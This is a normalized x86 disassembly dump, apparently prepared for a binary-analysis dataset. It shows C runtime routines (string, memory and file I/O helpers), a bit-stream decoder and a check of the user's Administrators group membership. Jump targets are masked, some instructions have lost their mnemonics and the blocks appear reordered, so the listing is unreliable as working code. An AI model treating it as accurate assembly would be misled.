mov [ esp + 0x10 ] ecx
cmp edx rw-data
jb r-xdata
mov al [ ebx + ecx ]
mov ecx [ ebp + ecx * 4 ]
mov [ edx ] al
mov eax esi
inc edx
inc esi
cmp eax 0xffe
jge r-xdata
lea ebx [ ebx ]
mov eax [ esp + 0x14 ]
cmp eax 0xffe
ja r-xdata
mov eax [ esp + 0x2c ]
mov esi [ eax + 0x4 ]
lea esp [ esp ]
push r--data
call sub_20050dc
add esp 0x4
push 0xfffffffd
call sub_2005441
cmp ecx 0xff
ja r-xdata
cmp ecx 0xff
ja r-xdata
mov [ esp + 0x18 ] edi
mov edi [ esp + 0x28 ]
call sub_2003580
mov edi eax
mov [ esp + 0x1c ] eax
cmp edi 0xfff
jne r-xdata
mov ecx [ esp + 0x18 ]
mov dl [ esp + 0x10 ]
mov [ ebp + eax * 4 ] ecx
mov [ ebx + eax ] dl
inc eax
mov [ esp + 0x14 ] eax
mov eax [ eax ]
mov edi [ esp + 0x1c ]
mov [ esp + 0x20 ] edx
mov dl [ edx ]
mov [ ecx + eax ] dl
mov eax [ esp + 0x2c ]
mov edx [ esp + 0x20 ]
inc ecx
mov [ eax + 0x8 ] ecx
xor ecx ecx
or ecx 0xffffffff
jmp r-xdata
mov al [ ebx + ecx ]
mov ecx [ ebp + ecx * 4 ]
mov [ edx ] al
mov eax esi
inc edx
inc esi
cmp eax 0xffe
jge r-xdata
jmp r-xdata
xor esi esi
cmp edi [ esp + 0x14 ]
jb r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x14
retn
cmp edx rw-data
jae r-xdata
dec edx
test ecx ecx
jl r-xdata
mov ecx [ eax + 0x8 ]
cmp esi ecx
jg r-xdata
sub_2003580
mov edx [ rw-data ]
cmp edx 0x18
push ebx
mov ebx [ rw-data ]
jg r-xdata
mov eax ebx
shl ebx 0xc
sub edx 0xc
mov [ rw-data ] ebx
shr eax 0x14
mov [ rw-data ] edx
pop ebx
retn
push ebp
mov ebp [ edi + 0x4 ]
push esi
mov esi [ edi + 0x8 ]
lea ebx [ ebx ]
mov eax [ edi ]
movzx eax [ eax + esi ]
inc esi
or eax 0xffffffff
jmp r-xdata
cmp ebp esi
jg r-xdata
mov [ edi + 0x8 ] esi
pop esi
pop ebp
mov ecx 0x18
sub ecx edx
shl eax cl
add edx 0x8
or ebx eax
cmp edx 0x18
jle r-xdata
sub_20035f0
sub esp 0x14
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10 ] eax
push ebx
xor ebx ebx
lea eax [ esp + 0x8 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x220
push 0x20
push 0x2
lea ecx [ esp + 0x34 ]
push ecx
mov [ esp + 0x38 ] bl
mov [ esp + 0x39 ] bl
mov [ esp + 0x3a ] bl
mov [ esp + 0x3b ] bl
mov [ esp + 0x3c ] bl
mov [ esp + 0x3d ] 0x5
call [ AllocateAndInitializeSid@IAT ]
mov [ esp + 0x4 ] eax
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x14 ]
pop ebx
xor ecx esp
call sub_2003680
add esp 0x14
retn
mov eax [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
push edx
push eax
push ebx
call [ CheckTokenMembership@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x8 ]
push ecx
call [ FreeSid@IAT ]
mov eax [ esp + 0x4 ]
mov [ esp + 0x4 ] ebx
sub_200368f
push 0xc
push r--data
call sub_2006310
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_2006355
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_2005816
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_2005849
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_2005621
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_20055df
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20036e5
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_2005879
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_2003720
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_20037b0
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
add edi 0x1
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_20037c0
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edi edi
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
add edi 0x1
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_20038a8
push 0xc
push r--data
call sub_2006310
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi ebx
setne al
cmp eax ebx
je r-xdata
call sub_2005621
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_2006be9
add esp 0x14
xor eax eax
cmp [ esi ] bl
setne al
cmp eax ebx
je r-xdata
call sub_2006355
retn
call sub_200697a
mov [ ebp + 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
cmp [ edi ] bl
jne r-xdata
call sub_2005621
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push esi
push edi
call sub_20066b1
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2003962
mov eax [ ebp - 0x1c ]
call sub_2005621
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_2006c10
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_2003983
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp edi esi
jne r-xdata
push 0x80
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_20038a8
add esp 0xc
mov [ edi ] eax
cmp eax esi
je r-xdata
call sub_2005621
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_2006be9
add esp 0x14
mov eax edi
jmp r-xdata
call sub_2005621
mov eax [ eax ]
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_20039e0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_2006dba
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_2003a5a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
xor edi edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x10 ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] edi
je r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x18 ]
cmp esi edi
je r-xdata
call sub_2005621
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
push edi
cmp ebx 0xffffffff
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp [ ebp + 0x14 ] eax
jbe r-xdata
cmp esi edi
je r-xdata
push ebx
push edi
push ecx
call sub_20039e0
add esp 0xc
mov edi [ ebp + 0x10 ]
imul edi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x10 ] edi
mov ebx edi
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp [ ebp + 0x14 ] eax
ja r-xdata
mov [ ebp - 0xc ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
test [ esi + 0xc ] 0x10c
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0xc ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_2006f08
pop ecx
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
jl r-xdata
mov eax edi
sub eax ebx
xor edx edx
div [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
cmp ebx eax
ja r-xdata
mov ecx 0x7fffffff
xor edx edx
cmp ebx ecx
jbe r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov [ ecx ] al
mov eax [ esi + 0x18 ]
dec ebx
dec [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
cmp eax [ ebp - 0x4 ]
ja r-xdata
mov eax ebx
mov eax ebx
div [ ebp - 0xc ]
mov eax ebx
mov eax ecx
div [ ebp - 0xc ]
mov eax ecx
jmp r-xdata
cmp edi [ ebp - 0x4 ]
ja r-xdata
mov edi eax
call sub_2005621
mov [ eax ] 0x22
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_20039e0
add esp 0xc
push eax
push [ ebp - 0x8 ]
push esi
call sub_20076f2
pop ecx
push eax
call sub_20075f5
add esp 0xc
test eax eax
je r-xdata
sub eax edx
jmp r-xdata
xor esi esi
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
push edi
push [ esi ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_2007724
sub [ esi + 0x4 ] edi
add [ esi ] edi
add [ ebp - 0x8 ] edi
sub ebx edi
add esp 0x10
sub [ ebp - 0x4 ] edi
mov edi [ ebp - 0x10 ]
jmp r-xdata
call sub_2006be9
add esp 0x14
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
call sub_2005621
push esi
push esi
push esi
push esi
mov [ eax ] 0x22
push esi
jmp r-xdata
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_20039e0
add esp 0xc
test ebx ebx
jne r-xdata
add [ ebp - 0x8 ] eax
sub ebx eax
sub [ ebp - 0x4 ] eax
jmp r-xdata
sub_2003c64
push 0xc
push r--data
call sub_2006310
xor esi esi
mov [ ebp - 0x1c ] esi
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
je r-xdata
cmp [ ebp + 0x18 ] esi
jne r-xdata
push [ ebp + 0x18 ]
call sub_20065d3
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2003a5a
add esp 0x14
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2003cf0
mov eax [ ebp - 0x1c ]
jmp r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
call sub_2006355
retn
call sub_2005621
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_2006be9
add esp 0x14
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_20039e0
add esp 0xc
sub_2003d20
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_2003db0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_2003ddd
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
or ebx 0xffffffff
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_2005621
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_2006be9
add esp 0x14
or eax ebx
jmp r-xdata
mov [ esi + 0xc ] edi
mov eax ebx
push esi
call sub_2004f49
push esi
mov ebx eax
call sub_200790a
push esi
call sub_20076f2
push eax
call sub_200783d
add esp 0x10
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push eax
call sub_200368f
pop ecx
mov [ esi + 0x1c ] edi
sub_2003e54
push 0xc
push r--data
call sub_2006310
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_2005621
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_2006be9
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
call sub_20065d3
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_2003ddd
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2003ec8
jmp r-xdata
mov [ esi + 0xc ] edi
call sub_2006355
retn
mov eax [ ebp - 0x1c ]
sub_2003ed0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_2003f58 ]
jmp [ ecx * 4 + jump_table_2003fd8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_2004044 ]
pop esi
pop edi
pop ebp
jmp sub_20079c2
jmp [ ecx * 4 + jump_table_20041e0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_20040e4 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_20041e0 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_2004044 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_20041e0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_2004044 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_2004044 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_2004044 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_20041e0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_20041e0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_20041e0 ]
sub_2004235
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_2008774
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_2008437
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_2007ccb
mov [ esi + 0x4 ] eax
sub_20042bc
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_20042f5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_2004235
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_2005621
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2006be9
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_2005621
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2006be9
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
push edi
push [ ebp + 0x8 ]
call sub_20042bc
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub esi eax
mov eax esi
pop esi
cmp esi eax
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_2008a4a
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_2008a4a
add esp 0x10
inc edi
cmp esi ebx
je r-xdata
sub_20043ca
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_20042f5
add esp 0xc
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_2005621
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_2006be9
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
pop esi
pop ebp
jmp sub_20042bc
pop esi
pop ebp
retn
sub_200441c
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_2005621
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2006be9
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_2008d69
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_2008b5f
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_2004499
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x10 ] ebx
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_2004235
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_2005621
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2006be9
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
